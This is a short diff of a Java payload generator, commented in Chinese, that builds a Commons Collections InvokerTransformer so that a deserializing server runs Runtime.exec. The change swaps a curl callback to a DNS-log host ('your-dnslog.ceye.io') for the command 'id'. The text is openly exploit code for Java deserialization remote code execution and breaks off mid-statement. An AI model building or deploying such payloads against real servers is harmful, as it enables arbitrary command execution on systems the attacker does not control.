@@ -12,10 +12,12 @@ import java.io.ObjectOutputStream;
 public class GenPayload {
     public static void main(String[] args) throws Exception {
         // InvokerTransformer: 反射调用任意方法
+        // 当服务端调用 t.transform(Runtime.getRuntime()) 时，
+        // InvokerTransformer 会反射执行 Runtime.exec("id")
         InvokerTransformer trans = new InvokerTransformer(
             "exec",                              // 方法名
             new Class[]{String.class},           // 参数类型
-            new Object[]{"curl http://your-dnslog.ceye.io"}  // 参数值
+            new Object[]{"id"}                   // 参数值
         );
 
         ObjectOutputStream oos = new ObjectOutputStream(
